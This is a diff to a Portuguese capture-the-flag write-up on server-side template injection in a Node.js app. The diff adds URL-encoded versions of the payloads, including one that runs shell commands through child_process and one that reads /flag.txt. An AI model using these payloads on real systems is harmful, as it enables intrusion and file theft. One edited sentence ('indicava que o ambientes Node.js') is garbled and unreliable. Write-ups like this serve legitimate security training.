@@ -68,6 +68,10 @@ Decidi então testar se a aplicação processava a entrada como parte de um temp
 <%= 2*2 %>
 ```
 
+```
+%3C%25%3D+2%2A2+%25%3E
+```
+
 O resultado refletido foi:
 
 ```
@@ -75,7 +79,7 @@ O resultado refletido foi:
 ```
 
 ✅ **Vulnerabilidade confirmada!**
-A aplicação estava vulnerável a **Template Injection**, e a sintaxe indicava que o motor usado era provavelmente **EJS** (Embedded JavaScript), popular em ambientes Node.js. 🐾🔥
+A aplicação estava vulnerável a **Template Injection**, e a sintaxe indicava que o ambientes Node.js. 🐾🔥
 
 ---
 
@@ -89,6 +93,10 @@ Com a vulnerabilidade confirmada, o próximo passo foi alcançar uma **Execuçã
 
 ```
 <%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls /").toString() %>
+```
+
+```
+%3C%25%3D+this.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%22child_process%22%29.execSync%28%22ls+%2F%22%29.toString%28%29+%25%3E
 ```
 
 #### Explicação:
@@ -115,6 +123,10 @@ Com a flag localizada, bastava ler seu conteúdo. 📖✨
 
 ```
 <%= global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8') %>
+```
+
+```
+%3C%25%3D+global.process.mainModule.require%28%27fs%27%29.readFileSync%28%27%2Fflag.txt%27%2C+%27utf8%27%29+%25%3E
 ```
 
 #### Explicação:
@@ -161,7 +173,7 @@ Esse desafio mostrou como uma simples reflexão de parâmetro pode evoluir para 
 🔁 **Resumo da exploração:**
 
 1.  Identifiquei o reflexo no HTML.
-2.  Confirmei que era um motor de template (EJS).
+2.  Confirmei que o ambiente era Nodejs.
 3.  Usei payloads para explorar o sistema e capturar a flag.
 
 ⚠️ **Lembre-se:** vulnerabilidades como essa podem comprometer um sistema inteiro. Desenvolvedores devem sempre validar inputs, aplicar o princípio de menor privilégio e manter suas dependências atualizadas.
